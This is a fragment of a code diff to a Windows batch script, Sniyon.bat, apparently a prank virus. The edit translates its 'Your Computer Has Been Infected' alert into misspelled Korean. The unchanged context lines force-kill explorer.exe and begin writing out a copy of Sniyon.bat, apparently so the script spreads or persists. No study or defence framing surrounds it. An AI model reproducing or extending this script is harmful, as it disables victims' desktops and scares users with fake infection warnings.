@@ -14,7 +14,7 @@ echo 니
 timeout 1 > nul
 cls
 color c
-echo Your Computer Has Been Infected By Sniyon.bat.
+echo 당신의컴푸터 는 Sniyon.bat에감염되엇습니다!
 timeout 1 > nul
 taskkill -f -im explorer.exe
 echo @echo off > Sniyon.bat
